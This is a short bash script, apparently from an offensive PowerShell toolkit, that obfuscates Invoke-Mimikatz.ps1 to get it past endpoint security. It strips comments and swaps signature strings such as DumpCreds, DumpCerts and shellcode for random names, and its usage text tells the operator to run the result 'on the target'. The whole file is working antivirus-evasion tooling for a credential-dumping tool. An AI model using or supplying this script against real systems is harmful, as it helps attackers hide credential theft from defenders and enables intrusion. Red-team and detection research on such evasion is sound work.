#!/bin/bash
# 
# Script to help bypass endpoint solutions and run Invoke-Mimikatz.ps1. 
# 
# Author: Ricardo Ribeiro Tavares (@1RicardoTavares)
# License: BSD 3-Clause
# https://github.com/1RicardoTavares/Offensive-PowerShell
#

if [[ $# -le 1 ]] ; then
    echo 'To avoid Invoke-Mimikatz.ps1 detection run:'
    echo './mz.sh Invoke-Mimikatz.ps1 newfile.ps1'
    echo 'Use the new file with the random function name on the target.'
    exit 1
fi

randstr(){< /dev/urandom tr -dc a-zA-Z0-9 | head -c${1:-8};}

cp $1 $2
sed -i -e "s/Invoke-Mimikatz/$(randstr)/g" $2
sed -i -e '/<#/,/#>/c\\' $2
sed -i -e "s/^[[:space:]]*#.*$//g" $2
sed -i -e "s/DumpCreds/$(randstr)/g" $2
sed -i -e "s/DumpCerts/$(randstr)/g" $2
sed -i -e "s/CustomCommand/$(randstr)/g" $2
sed -i -e "s/TypeBuilder/$(randstr)/g" $2
sed -i -e "s/Win32Types/$(randstr)/g" $2
sed -i -e "s/Win32Functions/$(randstr)/g" $2
sed -i -e "s/shellcode/$(randstr)/g" $2
sed -i -e "s/PEBytes64/$(randstr)/g" $2
sed -i -e "s/PEBytes32/$(randstr)/g" $2
sed -i -e "s/ArgumentPtr/$(randstr)/g" $2
sed -i -e "s/CallDllMainSC1/$(randstr)/g" $2